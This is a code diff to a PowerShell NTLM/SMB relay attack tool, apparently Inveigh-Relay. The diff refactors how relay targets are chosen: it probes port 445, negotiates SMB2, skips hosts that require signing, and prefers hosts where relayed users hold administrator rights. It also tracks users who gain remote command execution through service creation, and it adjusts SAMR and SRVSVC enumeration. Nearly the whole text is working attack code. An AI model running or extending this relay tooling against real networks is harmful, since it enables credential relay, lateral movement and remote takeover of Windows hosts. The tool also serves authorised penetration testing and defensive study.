@@ -2022,6 +2022,117 @@ $SMB_relay_functions_scriptblock =
     {
         param ($ProcessID,$SourceIP)
 
+        function Test-SMBPort
+        {
+            param ($target)
+
+            $SMB_target_test = New-Object System.Net.Sockets.TCPClient
+            $SMB_target_test_result = $SMB_target_test.BeginConnect($target,"445",$null,$null)
+            $SMB_port_test_success = $SMB_target_test_result.AsyncWaitHandle.WaitOne(100,$false)
+            $SMB_target_test.Close()
+
+            return $SMB_port_test_success
+
+        }
+
+        function Invoke-SMBNegotiate
+        {
+            param ($Target)
+
+            $SMB_client = New-Object System.Net.Sockets.TCPClient
+            $SMB_client.Client.ReceiveTimeout = 60000
+            $SMB_client.Connect($target,"445")
+
+            try
+            {
+                $SMB_client_stream = $SMB_client.GetStream()
+                $stage = 'NegotiateSMB'
+                $SMB_client_receive = New-Object System.Byte[] 1024
+            }
+            catch
+            {
+                $stage = 'Exit'
+            }
+
+            while($stage -ne 'Exit')
+            {
+            
+                switch ($stage)
+                {
+
+                    'NegotiateSMB'
+                    {
+                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $ProcessID 0x00,0x00       
+                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
+                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
+                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
+                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
+                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
+                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                        $SMB_client_stream.Flush()    
+                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+
+                        if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
+                        {
+                            $SMB2 = $false
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Negotiated SMB1 not supported") > $null
+                            $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying anonther target") > $null
+                            $SMB_client.Close()
+                            $stage = 'Exit'
+                        }
+                        else
+                        {
+                            $SMB2 = $true
+                            $stage = 'NegotiateSMB2'
+                        }
+
+                        if($target -and [System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03')
+                        {        
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Signing is required on $target") > $null
+                            $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying another target") > $null
+                            $signing = $true
+                            $SMB_client.Close()
+                            $stage = 'Exit'
+                        }
+                        elseif($signing_check) # check
+                        {
+                            $SMB_client.Close()
+                            $stage = 'Exit'
+                        }
+                        else
+                        {
+                            $signing = $false    
+                        }
+
+                    }
+                    
+                    'NegotiateSMB2'
+                    { 
+                        $tree_ID = 0x00,0x00,0x00,0x00
+                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+                        $message_ID = 1
+                        $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $ProcessID $tree_ID $session_ID  
+                        $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
+                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
+                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
+                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
+                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
+                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
+                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                        $SMB_client_stream.Flush()    
+                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                        $stage = 'Exit'
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target") > $null
+                    }
+                
+                }
+
+            }
+
+            return $SMB_client,$SMB2,$signing
+        }
+
         if($inveigh.target_list -gt 1)
         {
             $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Selecting a target") > $null
@@ -2029,28 +2140,74 @@ $SMB_relay_functions_scriptblock =
 
         try
         {
-            $i = 0
             $target = $null
-            $initiator_sessions = $inveigh.enumeration_list | Where-Object {$_.IP -eq $SourceIP} | Select-Object -expand Sessions
+            $initiator_sessions = $inveigh.enumeration_list | Where-Object {$_.IP -eq $SourceIP -and $_.Sessions} | Select-Object -expand Sessions
             $filter_date = Get-Date
             $targets_excluded = $inveigh.enumeration_list | Where-Object {$_.IP -eq $SourceIP -or ($_.Targeted -and !$_."SMB2.1" -or $_.Signing) -or ($_.Targeted -and !$_."SMB Server" -and (New-TimeSpan $_."Last Activity" $filter_date).Minutes -lt 10)} | Select-Object -expand IP
             
-            if($targets_excluded.Count -gt 0)
+            if($targets_excluded)
             {
-                $targets_filtered = Compare-Object -ReferenceObject $targets_excluded -DifferenceObject $inveigh.target_list -PassThru
+                $targets_filtered = Compare-Object -ReferenceObject $targets_excluded -DifferenceObject $inveigh.target_list -PassThru # check
             }
             else
             {
                 $targets_filtered = $inveigh.target_list
             }
 
-            if($initiator_sessions.Count -gt 0)
+            if($initiator_sessions)
             {
-
                 ForEach($session in $initiator_sessions)
                 {
                     $targets = $inveigh.enumeration_list | Where-Object {$_."Administrator Users" -contains $session} | Select-Object -expand IP
-                    $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $targets_filtered -IncludeEqual -ExcludeDifferent -PassThru
+
+                    if($targets)
+                    {
+                        $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $targets_filtered -IncludeEqual -ExcludeDifferent -PassThru
+
+                        if($targets -and (Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP | Where-Object {$_.SideIndicator -eq "<="}))
+                        {
+                            $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP -PassThru | Where-Object {$_.SideIndicator -eq "<="}
+                        }
+                        else
+                        {
+                            $targets_temp = $targets
+                            $targets = @()
+
+                            ForEach($target_entry in $targets_temp)
+                            {
+                                [Array]$sessions = $inveigh.session_list | Where-Object {$_.Target -eq $target_entry -and $_.Status -eq 'connected'}
+
+                                if($sessions.Count -lt $SessionLimitPriv)
+                                {
+                                    $targets += $target_entry
+                                }
+
+                            }
+                                
+                        }
+
+                    }
+                    
+                    if(!$targets)
+                    {
+                        $targets = $inveigh.enumeration_list | Where-Object {$_."Shares".Count -gt 0} | Select-Object -expand IP
+
+                        if($targets)
+                        {
+                            $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $targets_filtered -IncludeEqual -ExcludeDifferent -PassThru
+
+                            if($targets -and (Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP | Where-Object {$_.SideIndicator -eq "<="}))
+                            {
+                                $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP -PassThru | Where-Object {$_.SideIndicator -eq "<="}
+                            }
+                            else
+                            {
+                                $targets = $null    
+                            }
+
+                        }
+                        
+                    }
                     
                     if($targets)
                     {
@@ -2065,11 +2222,60 @@ $SMB_relay_functions_scriptblock =
                             }
 
                         }
-                        
-                        if(Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP | Where-Object {$_.SideIndicator -eq "=>"})
+
+                        if($targets)
                         {
-                            $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP -PassThru | Where-Object {$_.SideIndicator -eq "=>"}
-                            $target = $targets[(Get-Random -Maximum $targets.Count)]
+                            $i = 0
+                            $random_index_history = @()
+
+                            while(!$target -and $i -lt $targets.Count)
+                            {
+                                $i++
+
+                                if($targets.Count -eq 1)
+                                {
+                                    $target = $targets[0]
+                                }
+                                else
+                                {
+                                    $random_range = 0..($targets.Count - 1)
+                                    $random_range_filtered = $random_range | Where-Object {$random_index_history -notcontains $_}
+
+                                    if($random_range_filtered)
+                                    {
+                                        $random_index = Get-Random -InputObject $random_range_filtered
+                                        $random_index_history += $random_index
+                                        $target = $targets[$random_index]
+                                    }
+
+                                }
+
+                                $SMB_port_test_success = Test-SMBPort $target
+
+                                if($SMB_port_test_success)
+                                {
+                                    $SMB_negotiate = Invoke-SMBNegotiate $target
+                                    $SMB_client = $SMB_negotiate[0]
+                                    $SMB2 = $SMB_negotiate[1]
+                                    $signing = $SMB_negotiate[2]
+                                    $SMB_server = $true
+                                }
+                                else
+                                {
+                                    $SMB2 = $null
+                                    $signing = $null
+                                    $SMB_server = $false
+                                    $target = $null    
+                                }
+
+                                $target_index = $inveigh.enumeration_list | Where-Object {$_.IP -eq $target} | Select-Object -expand Index
+                                $inveigh.enumeration_list[$target_index].Targeted = $true
+                                $inveigh.enumeration_list[$target_index]."SMB2.1" = $SMB2
+                                $inveigh.enumeration_list[$target_index].Signing = $signing
+                                $inveigh.enumeration_list[$target_index]."SMB Server" = $SMB_server
+                                $inveigh.enumeration_list[$target_index]."Last Activity" = $(Get-Date -format s)
+                            }
+
                         }
                         
                     }
@@ -2078,112 +2284,34 @@ $SMB_relay_functions_scriptblock =
 
             }
 
+            $i = 0
+            $random_index_history = @()
+            
             while(!$target -and $i -lt $targets_filtered.Count)
             {
-                $target = $targets_filtered[(Get-Random -Maximum $targets_filtered.Count)]
+                $i++
+                $random_range = 0..($targets_filtered.Count - 1)
+                $random_range_filtered = $random_range | Where-Object {$random_index_history -notcontains $_}
 
-                if($target -ne $SourceIP)
+                if($random_range_filtered)
                 {
-                    $SMB_target_test = New-Object System.Net.Sockets.TCPClient
-                    $SMB_target_test_result = $SMB_target_test.BeginConnect($target,"445",$null,$null)
-                    $SMB_port_test_success = $SMB_target_test_result.AsyncWaitHandle.WaitOne(100,$false)
-                    $SMB_target_test.Close()
-                    $i++
+                    $random_index = Get-Random -InputObject $random_range_filtered
+                    $random_index_history += $random_index
+                    $target = $targets_filtered[$random_index]
+                    $SMB_port_test_success = $false
+                }
+
+                if($target -and $target -ne $SourceIP -and $inveigh.relay_history_table.$SourceIP -notcontains $target)
+                {
+                    $SMB_port_test_success = Test-SMBPort $target
 
                     if($SMB_port_test_success)
                     {
                         $SMB_server = $true
-                        $SMB_client = New-Object System.Net.Sockets.TCPClient
-                        $SMB_client.Client.ReceiveTimeout = 60000
-                        $SMB_client.Connect($target,"445")
-
-                        try
-                        {
-                            $SMB_client_stream = $SMB_client.GetStream()
-                            $stage = 'NegotiateSMB'
-                            $SMB_client_receive = New-Object System.Byte[] 1024
-                        }
-                        catch
-                        {
-                            $stage = 'Exit'
-                        }
-
-                        while($stage -ne 'Exit')
-                        {
-                        
-                            switch ($stage)
-                            {
-
-                                'NegotiateSMB'
-                                {
-                                    $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $ProcessID 0x00,0x00       
-                                    $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
-                                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
-                                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
-                                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
-                                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
-                                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
-                                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
-                                    $SMB_client_stream.Flush()    
-                                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
-
-                                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
-                                    {
-                                        $SMB2 = $false
-                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Negotiated SMB1 not supported") > $null
-                                        $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying anonther target") > $null
-                                        $SMB_client.Close()
-                                        $stage = 'Exit'
-                                    }
-                                    else
-                                    {
-                                        $SMB2 = $true
-                                        $stage = 'NegotiateSMB2'
-                                    }
-
-                                    if($target -and [System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03')
-                                    {        
-                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Signing is required on $target") > $null
-                                        $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying another target") > $null
-                                        $signing = $true
-                                        $SMB_client.Close()
-                                        $stage = 'Exit'
-                                    }
-                                    elseif($signing_check) # check
-                                    {
-                                        $SMB_client.Close()
-                                        $stage = 'Exit'
-                                    }
-                                    else
-                                    {
-                                        $signing = $false    
-                                    }
-
-                                }
-                                
-                                'NegotiateSMB2'
-                                { 
-                                    $tree_ID = 0x00,0x00,0x00,0x00
-                                    $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
-                                    $message_ID = 1
-                                    $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $ProcessID $tree_ID $session_ID  
-                                    $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
-                                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
-                                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
-                                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
-                                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
-                                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
-                                    $SMB_client_stream.Flush()    
-                                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
-                                    $stage = 'Exit'
-                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target") > $null
-                                }
-                            
-                            }
-
-                        }
-
+                        $SMB_negotiate = Invoke-SMBNegotiate $target
+                        $SMB_client = $SMB_negotiate[0]
+                        $SMB2 = $SMB_negotiate[1]
+                        $signing = $SMB_negotiate[2]
                     }
                     else
                     {
@@ -2195,7 +2323,6 @@ $SMB_relay_functions_scriptblock =
                         $target_index = $inveigh.enumeration_list | Where-Object {$_.IP -eq $target} | Select-Object -expand Index
                         $inveigh.enumeration_list[$target_index].Targeted = $true
                         $inveigh.enumeration_list[$target_index]."Last Activity" = $(Get-Date -format s)
-                        #$inveigh.enumeration_list | Where-Object {$_.IP -eq $target} | ForEach-Object {$_."Last Activity" = $(Get-Date -format s)}
                     }
                     else
                     {
@@ -2535,8 +2662,16 @@ $SMB_relay_functions_scriptblock =
                             $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                             $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full has command execution privilege on $target") > $null
+                            $administrator_list = $inveigh.enumeration_list | Where-Object {$_.IP -eq $target} | ForEach-Object {$_."Administrator Users"}
 
-                            if(!$inveigh.relay_privilege_table.$HTTP_username_full)
+                            if($administrator_list -notcontains $HTTP_username_full)
+                            {
+                                $administrator_list += $HTTP_username_full
+                                $target_index = $inveigh.enumeration_list | Where-Object {$_.IP -eq $target} | Select-Object -expand Index
+                                $inveigh.enumeration_list[$target_index].Sessions = $administrator_list
+                            }
+
+                            if(!$inveigh.relay_privilege_table.$HTTP_username_full) # check
                             {
                                 $inveigh.relay_privilege_table.Add($HTTP_username_full,[Array]$target)
                             }
@@ -4013,17 +4148,36 @@ $SMB_relay_functions_scriptblock =
                             'Connect2'
                             {
                                 $step++
-                                $SID_count = 0x04,0x00,0x00,0x00
-                                [Byte[]]$SAMR_connect_handle = $client_receive[140..159]
-                                $stage = 'OpenDomain'
+
+                                if($client_receive[119] -eq 3 -and [System.BitConverter]::ToString($client_receive[140..143]) -eq '05-00-00-00')
+                                {
+                                    $RPC_access_denied = $true
+                                    $stage = 'CloseRequest'
+                                }
+                                else
+                                {
+                                    $SID_count = 0x04,0x00,0x00,0x00
+                                    [Byte[]]$SAMR_connect_handle = $client_receive[140..159]
+                                    $stage = 'OpenDomain'
+                                }
+
                             }
 
                             'Connect5'
                             {
                                 $step++
-                                $SID_count = 0x04,0x00,0x00,0x00
-                                [Byte[]]$SAMR_connect_handle = $client_receive[156..175]
-                                $stage = 'OpenDomain'
+
+                                if($client_receive[119] -eq 3 -and [System.BitConverter]::ToString($client_receive[140..143]) -eq '05-00-00-00')
+                                {
+                                    $stage = 'CloseRequest'
+                                }
+                                else
+                                {
+                                    $SID_count = 0x04,0x00,0x00,0x00
+                                    [Byte[]]$SAMR_connect_handle = $client_receive[156..175]
+                                    $stage = 'OpenDomain'
+                                }
+
                             }
 
                             'CreateRequest'
@@ -4201,7 +4355,16 @@ $SMB_relay_functions_scriptblock =
 
                             'NetSessEnum'
                             {
-                                $stage = 'ParseSRVSVC'
+
+                                if([System.BitConverter]::ToString($client_receive[172..175]) -eq '05-00-00-00')
+                                {
+                                    $stage = 'CloseRequest'
+                                }
+                                else
+                                {
+                                    $stage = 'ParseSRVSVC'
+                                }
+
                             }
 
                             'NetShareEnumAll'
@@ -4362,9 +4525,18 @@ $SMB_relay_functions_scriptblock =
 
                                         'group'
                                         {
-                                            $action_stage = "user"
+
+                                            if($RPC_access_denied)
+                                            {
+                                                $action_stage = "share"
+                                            }
+                                            else
+                                            {
+                                                $action_stage = "user"
+                                                $step = 0
+                                            }
+
                                             $stage = "treeconnect"
-                                            $step = 0
                                         }
 
                                         'user'
@@ -4842,7 +5014,7 @@ $HTTP_scriptblock =
                     
                         if(!$target)
                         {
-                            $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Valid target not found") > $null
+                            $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Eligible target not found") > $null
                             $relay_step = 0
                         }
                         elseif(!$SMB_client.connected)
@@ -5018,17 +5190,15 @@ $HTTP_scriptblock =
 
                     }
 
-                    $session_list = $inveigh.enumeration_list | Where-Object {$_.IP -eq $HTTP_source_IP} | Select-Object -expand Sessions
-
-                    if($session_list)
+                    if($inveigh.enumeration_list | Where-Object {$_.IP -eq $HTTP_source_IP})
                     {
+                        $session_list = $inveigh.enumeration_list | Where-Object {$_.IP -eq $HTTP_source_IP} | ForEach-Object {$_.Sessions}
 
                         if($session_list -notcontains $HTTP_username_full)
                         {
                             $session_list += $HTTP_username_full
                             $target_index = $inveigh.enumeration_list | Where-Object {$_.IP -eq $HTTP_source_IP} | Select-Object -expand Index
                             $inveigh.enumeration_list[$target_index].Sessions = $session_list
-                            #$inveigh.enumeration_list | Where-Object {$_.IP -eq $HTTP_source_IP} | ForEach-Object {$_.Sessions = $session_list}
                         }
 
                     }
